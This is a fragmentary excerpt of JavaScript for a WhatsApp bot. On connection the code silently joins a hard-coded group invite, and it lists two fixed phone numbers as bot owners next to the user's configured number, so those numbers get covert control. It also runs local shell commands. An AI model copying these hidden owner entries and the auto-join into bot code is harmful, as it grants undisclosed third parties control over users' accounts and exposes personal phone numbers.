...
denz.autoReconnect = ReconnectMode.onConnectionLost
 ...
 teks = `https://chat.whatsapp.com/jjkmmmmn`
 denz.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
 console.log(color('|WRN|', 'yellow'), color('Joined to boot group', 'cyan'))
...
exec(`cd /sdcard/download && play *mp3`)
   ...
   denz.on('chat-update', async (mek) => {
        ...
        ownerNumber = ["6285774523785@s.whatsapp.net","6281389812069@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
...
function doProgress()
{
	...
	if ( progress >= 1 )
	{
		...
		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
			console.log(stdout), console.log(bgcolor('Halo saya adalah AI Im Boost', 'purple'))})}, 200 ) ;
	}
	else
	{
